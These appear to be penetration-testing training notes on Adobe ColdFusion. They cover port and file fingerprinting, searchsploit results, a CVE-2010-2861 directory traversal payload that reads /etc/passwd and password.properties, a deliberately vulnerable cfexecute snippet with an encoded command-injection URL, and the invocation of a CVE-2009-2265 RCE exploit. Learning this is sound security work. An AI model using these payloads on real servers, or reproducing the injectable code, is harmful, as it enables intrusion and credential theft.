## Discovery & Enumeration
ColdFusion is a programming language and a web application development platform based on Java. It is used to build dynamic and interactive web applications that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. 

ColdFusion Markup Language (`CFML`) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web developers. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. Its tag-based approach simplifies application development by reducing the amount of code needed to accomplish complex tasks. 

Some of the primary purposes and benefits of ColdFusion include:

|**Benefits**|**Description**|
|---|---|
|`Developing data-driven web applications`|ColdFusion allows developers to build rich, responsive web applications easily. It offers session management, form handling, debugging, and more features. ColdFusion allows you to leverage your existing knowledge of the language and combines it with advanced features to help you build robust web applications quickly.|
|`Integrating with databases`|ColdFusion easily integrates with databases such as Oracle, SQL Server, and MySQL. ColdFusion provides advanced database connectivity and is designed to make it easy to retrieve, manipulate, and view data from a database and the web.|
|`Simplifying web content management`|One of the primary goals of ColdFusion is to streamline web content management. The platform offers dynamic HTML generation and simplifies form creation, URL rewriting, file uploading, and handling of large forms. Furthermore, ColdFusion also supports AJAX by automatically handling the serialisation and deserialisation of AJAX-enabled components.|
|`Performance`|ColdFusion is designed to be highly performant and is optimised for low latency and high throughput. It can handle a large number of simultaneous requests while maintaining a high level of performance.|
|`Collaboration`|ColdFusion offers features that allow developers to work together on projects in real-time. This includes code sharing, debugging, version control, and more. This allows for faster and more efficient development, reduced time-to-market and quicker delivery of projects.|

Like any web-facing technology, ColdFusion has historically been vulnerable to various types of attacks, such as SQL injection, XSS, directory traversal, authentication bypass, and arbitrary file uploads. . Here are a few known vulnerabilities of ColdFusion:

1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

ColdFusion exposes a fair few ports by default:

|Port Number|Protocol|Description|
|---|---|---|
|80|HTTP|Used for non-secure HTTP communication between the web server and web browser.|
|443|HTTPS|Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.|
|1935|RPC|Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) is used for sending email messages.|
|8500|SSL|Used for server communication via Secure Socket Layer (SSL).|
|5500|Server Monitor|Used for remote administration of the ColdFusion server.|
### Enumeration
| **Method**        | **Description**                                                                                                                                                 |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Port Scanning`   | ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. Nmap might be able to identify ColdFusion during a services scan specifically.    |
| `File Extensions` | ColdFusion pages typically use ".cfm" or ".cfc" file extensions.                                                                                                |
| `HTTP Headers`    | Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion". |
| `Error Messages`  | If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.                    |
| `Default Files`   | ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm".                                           |
- `8500` is a default port that ColdFusion uses for SSL.
- If we navigate to `IP:8500` and see 2 directories, `CFIDE` and `cfdocs,` in the root.
- Navigating around the structure a bit shows lots of interesting info, from files with a clear `.cfm` extension to error messages and login pages.
- `/CFIDE/administrator` loads the ColdFusion Administrator login page. This will tell us the version as well.
## Attacking
Imagine the target has ColdFusion 8. We use `searchsploit`:
```sh
searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
`Adobe ColdFusion - Directory Traversal` and the `Adobe ColdFusion 8 - Remote Command Execution (RCE)` results.
### Directory Traversal
`CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

These ColdFusion files are vulnerable to a directory traversal attack in `Adobe ColdFusion 9.0.1` and `earlier versions`. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the `locale parameter` in these specific ColdFusion files.
```sh
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd

searchsploit -p 14641

python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
### Unauthenticated RCE
Take the following code:
```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```
In the above code, the `cmd` variable is created by concatenating the `cgi.query_string` variable with a command to be executed. This command is then executed using the `cfexecute` function, which runs the Windows `cmd.exe` program with the specified arguments. This code is vulnerable to an unauthenticated RCE attack because it does not properly validate the `cmd` variable before executing it, nor does it require the user to be authenticated. An attacker could simply pass a malicious command as the `cgi.query_string` variable, and it would be executed by the server.
```http
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```
`CVE-2009-2265` is the vulnerability identified by our earlier searchsploit search as `Adobe ColdFusion 8 - Remote Command Execution (RCE)`. Pull it into a working directory.
```sh
searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
  ...

python3 50057.py  # configure lhost lport rhost rport first  
```
